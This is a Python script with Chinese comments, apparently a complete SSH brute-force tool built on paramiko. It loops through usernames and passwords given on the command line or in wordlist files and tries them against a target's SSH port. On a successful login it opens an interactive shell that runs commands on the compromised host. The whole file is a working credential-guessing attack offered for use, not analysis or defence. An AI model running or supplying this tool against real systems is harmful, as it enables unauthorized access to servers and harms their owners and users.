import paramiko
import argparse
import sys
 
def sshbrute(user,passw,host):
    # 设置 flag 为 0 ，在成功登录的时候再置为 1 
    flag = 0
    try:
        # 使用 paramiko.SSHClient 创建 ssh 对象
        ssh = paramiko.SSHClient()
 
        # 允许将信任的主机自动加入到host_allow 列表，此方法必须放在connect方法的前面，接受对方的公钥证书
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
        # 登录 ssh，连接失败则抛出 异常 跳转到 except ，成功则继续执行
        ssh.connect(hostname=host,port=22,username=user,password=passw,timeout=1)
 
        # 打印出成功登录的 用户名 和 密码
        print("login success! User:"+user,"Pass:"+passw +"<br>")
        # 把 flag 置为 1
        flag = 1
 
    except:
        # 打印出 登录失败 的 用户名 和 密码
        print("login failed!","user:"+user,"pass:"+passw +"<br>")
    # 如果 flag 为 1，则进入 terminal
    if flag == 1:
        while True:
            # 获取 输入的命令
            input_command = input(">>")
            # 如果 输入 quit 就关闭 ssh 连接，并退出程序
            if input_command == 'quit':
                print("byebye~~")
                ssh.close()
                exit(0)
            # 执行 输入的命令
            stdin,stdout,stderr = ssh.exec_command(input_command)
            # 获取 返回的结果 并打印
            result = stdout.read()
            print(str(result,'utf-8') + "<br>")
 
if __name__ == "__main__":
    # 自定义接受参数
    parse = argparse.ArgumentParser("python3 "+sys.argv[0])
    parse.add_argument("-u <USER>","--user",help="login with user name")
    parse.add_argument("-U <USERFILE>","--userfile",help="load user from USERfile")
    parse.add_argument("-p <PASS>","--passwd",help="try passwd with PASS")
    parse.add_argument("-P <PASSFILE>","--passfile",help="load PASS from PASSFILE")
    parse.add_argument("-t","--target",help="client ip ")
    # 把接受到的参数保存在变量中
    args = parse.parse_args()
    user = args.user
    passw = args.passwd
    target = args.target
    ufile = args.userfile
    pfile = args.passfile
 
    # 判断 target 是否存在
    if not target:
        print("target not set! use -h to get help!")
        exit(0)
    # 如果 输入了 -U 和 -P 参数则循环读出 ufile 中的 用户名 和 pfile 中的密码
    if ufile and pfile:
        tmp_ufile = open(ufile,'r')
        tmp_pfile = open(pfile,'r')
        # 循环输入用户名
        for a in tmp_ufile.readlines():
            tmp_pfile = open(pfile,'r')
            # 循环输入密码
            for b in tmp_pfile.readlines():
                sshbrute(a.replace('\n',''),b.replace('\n',''),target)
            # 密码读取完后需要关闭 在下一次读取的时候重新打开
            tmp_pfile.close()
        tmp_ufile.close()
    # 如果 输入了 -P 和 -u 则循环读出 pfile 中的 密码，用 <user> 和 pfile中的密码登录 
    elif pfile and user:
        tmp_pfile = open(pfile,'r')
        res_pfile = tmp_pfile.readlines()
        tmp_pfile.close()
        for i in res_pfile:
            sshbrute(user,i.replace('\n',''),target)
    # 如果 输入了 -U 和 -p 就循环读出 ufile 中的用户名，用 <passw> 和 ufile中的用户名登录
    elif ufile and passw:
        tmp_ufile = open(ufile,'r')
        res_ufile = tmp_ufile.readlines()
        tmp_ufile.close()
        for i in res_ufile:
            sshbrute(i.replace('\n',''),passw,target)
    # 如果直接给出了 用户名和密码 则直接使用给出的用户名和密码登录
    elif user and passw:
        sshbrute(user,passw,target)